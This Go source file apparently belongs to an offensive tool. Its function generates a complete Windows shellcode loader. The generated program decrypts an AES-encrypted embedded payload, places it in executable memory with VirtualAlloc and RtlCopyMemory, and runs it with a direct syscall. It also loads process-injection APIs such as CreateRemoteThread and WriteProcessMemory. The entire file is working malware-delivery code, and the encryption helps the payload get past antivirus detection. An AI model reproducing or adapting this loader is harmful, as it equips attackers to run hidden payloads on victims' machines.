package loader

import (
	"fmt"
)

func LoadWindowsTemplate(s Shellcode) string {

    hexShellcode := ToString(s.Payload)
    hexKey := ToString(s.AesKey)

    return fmt.Sprintf(`
package main

import (
        "crypto/aes"
        "os"
        "syscall"
        "unsafe"
        "strings"
        "strconv"
        "crypto/cipher"
        "errors"
)


const (
    MEM_COMMIT                = 0x1000
    MEM_RESERVE               = 0x2000
    PAGE_EXECUTE_READWRITE    = 0x40
    PROCESS_CREATE_THREAD     = 0x0002
    PROCESS_QUERY_INFORMATION = 0x0400
    PROCESS_VM_OPERATION      = 0x0008
    PROCESS_VM_WRITE          = 0x0020
    PROCESS_VM_READ           = 0x0010
)

var (
    kernel32            = syscall.MustLoadDLL("kernel32.dll")
    ntdll               = syscall.MustLoadDLL("ntdll.dll")
    VirtualAlloc        = kernel32.MustFindProc("VirtualAlloc")
    VirtualAllocEx      = kernel32.MustFindProc("VirtualAllocEx")
    WriteProcessMemory  = kernel32.MustFindProc("WriteProcessMemory")
    RtlCopyMemory       = ntdll.MustFindProc("RtlCopyMemory")
    CreateThread        = kernel32.MustFindProc("CreateThread")
    OpenProcess         = kernel32.MustFindProc("OpenProcess")
    WaitForSingleObject = kernel32.MustFindProc("WaitForSingleObject")
    procVirtualProtect  = kernel32.MustFindProc("VirtualProtect")
    CreateRemoteThread  = kernel32.MustFindProc("CreateRemoteThread")
)

func decrypt(key []byte, ciphertext []byte) ([]byte, error) {
    c, err := aes.NewCipher(key)
    if err != nil {
        return nil, err
    }

    gcm, err := cipher.NewGCM(c)
    if err != nil {
        return nil, err
    }

    nonceSize := gcm.NonceSize()
    if len(ciphertext) < nonceSize {
        return nil, errors.New("ciphertext too short")
    }

    nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
    return gcm.Open(nil, nonce, ciphertext, nil)
}


func StringBytesParseString(byteString string) (string, error) {
    byteString = strings.TrimSuffix(byteString, "]")
    byteString = strings.TrimLeft(byteString, "[")
    sByteString := strings.Split(byteString, " ")
    var res []byte
    for _, s := range sByteString {
        i, err := strconv.ParseUint(s, 10, 64)
        if err != nil {
            return "", err
        }
        res = append(res, byte(i))
    }

    return string(res), nil
}

func main() {
    /* decrypt shellcode using AES */
    key, err := StringBytesParseString("%s"); if err != nil {
        os.Exit(1)
    }

    bytesPayload, err := StringBytesParseString("%s"); if err != nil {
        os.Exit(1)
    }

    payload, err := decrypt([]byte(key), []byte(bytesPayload)); if err != nil {
        os.Exit(1)
    }
    addr, _, err := VirtualAlloc.Call(
        0,
        uintptr(len(payload)),
        MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
    )

    if err != nil && err.Error() != "The operation completed successfully." {
        os.Exit(0)
    }

    _, _, err = RtlCopyMemory.Call(
        addr,
        (uintptr)(unsafe.Pointer(&payload[0])),
        uintptr(len(payload)),
    )

    if err != nil && err.Error() != "The operation completed successfully." {
        os.Exit(0)
    }

    syscall.Syscall(addr, 0, 0, 0, 0)
}
`, hexKey, hexShellcode)
}
